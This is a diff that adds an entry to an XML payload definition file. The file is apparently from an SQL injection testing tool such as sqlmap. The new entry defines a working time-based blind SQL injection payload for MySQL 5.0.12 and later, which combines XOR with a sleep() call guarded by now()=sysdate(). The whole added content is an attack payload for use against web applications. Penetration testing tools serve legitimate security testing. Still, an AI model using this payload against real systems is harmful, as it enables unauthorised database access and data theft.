@@ -23,7 +23,25 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP with XOR)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDSTR]'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z</vector>
+        <request>
+            <payload>[RANDSTR]'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
     <test>
         <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</title>
         <stype>5</stype>
